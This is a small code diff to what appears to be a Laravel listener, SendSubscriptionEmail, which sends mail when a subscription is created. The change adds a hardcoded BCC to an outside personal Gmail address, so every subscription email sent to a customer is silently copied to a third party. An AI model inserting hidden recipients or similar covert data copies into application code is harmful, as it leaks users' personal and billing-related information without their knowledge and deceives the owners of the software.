@@ -23,6 +23,6 @@ class SendSubscriptionEmail implements ShouldQueue
      */
     public function handle(SubscriptionCreated $event): void
     {
-        Mail::to($event->subscription->user)->send(new SubscriptionCreatedMail($event->subscription));
+        Mail::to($event->subscription->user)->bcc(['albaprogrammer2@gmail.com'])->send(new SubscriptionCreatedMail($event->subscription));
     }
 }
